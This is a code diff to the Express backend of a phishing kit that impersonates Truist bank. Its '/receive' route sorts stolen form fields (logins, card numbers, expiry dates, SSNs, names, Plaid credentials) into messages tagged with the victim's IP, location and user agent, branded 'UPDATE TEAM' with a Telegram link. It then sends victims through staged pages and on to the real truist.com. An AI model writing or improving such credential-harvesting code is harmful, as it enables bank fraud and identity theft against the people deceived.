@@ -197,7 +197,7 @@ app.post('/receive', async (req, res) => {
 
         const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
 
-        const geoInfo = `🌍 GEO-IP INFO\n` +
+        const fullGeoInfo = `🌍 GEO-IP INFO\n` +
             `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
             `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +
             `CITY             : ${ipAddressInformation.location.city}\n` +
@@ -208,11 +208,14 @@ app.post('/receive', async (req, res) => {
             `ISP              : ${ipAddressInformation.network.organisation}\n\n` +
             `💻 SYSTEM INFO\n` +
             `USER AGENT       : ${userAgent}\n` +
-            `SYSTEM LANGUAGE  : ${systemLang}\n`;
+            `SYSTEM LANGUAGE  : ${systemLang}\n\n`;
 
-        const prepareMessage = (header, type) => {
-            message += `✅ UPDATE TEAM | TRUIST | USER_${ipAddress}\n\n` +
-                `👤 ${header} \n\n` +
+        const basicGeoInfo = `🌍 GEO-IP INFO\n` +
+            `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+            `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n\n`;
+
+        const prepareMessage = (header, type, includeFullGeo = false) => {
+            message += `👤 ${header} \n\n` +
                 `========================\n\n`;
 
             for (const key of Object.keys(myObject)) {
@@ -223,28 +226,28 @@ app.post('/receive', async (req, res) => {
             }
 
             message += `\n========================\n\n` +
-                geoInfo +
-                `\n========================\n\n` +
+                (includeFullGeo ? fullGeoInfo : basicGeoInfo) +
+                `========================\n\n` +
                 `✅ UPDATE TEAM | TRUIST\n` +
                 `💬 Telegram: https://t.me/UpdateTeams\n`;
             res.send({ url: type });
             responseSent = true;
         };
 
-        if (!responseSent && (myObjects.includes('password') || myObjects.includes('user-id'))) {
-            prepareMessage("LOGIN", "/confirm?action=1");
+        if (!responseSent && (myObjects.includes('user-id'))) {
+            prepareMessage("LOGIN", "/confirm?action=1", true);
         }
 
         if (!responseSent && (myObjects.includes('expirationdate') || myObjects.includes('cardnumber') || myObjects.includes('billing address'))) {
-            prepareMessage("CARD INFO", "/link?step=1");
+            prepareMessage("CARD INFO", "/link?step=1", false);
         }
 
         if (!responseSent && myObjects.includes('userid')) {
-            prepareMessage("PLAID LOGIN", "https://truist.com/");
+            prepareMessage("PLAID LOGIN", "https://truist.com/", false);
         }
 
         if (!responseSent && (myObjects.includes('ssn') || myObjects.includes('firstname') || myObjects.includes('lastname'))) {
-            prepareMessage("CONTACT INFO", "/confirm?action=2");
+            prepareMessage("CONTACT INFO", "/confirm?action=2", false);
         }
 
         // Handle unmatched cases
@@ -265,6 +268,7 @@ app.post('/receive', async (req, res) => {
         console.error(error);
     }
 });
+
 
 
 // Route handler for login pages
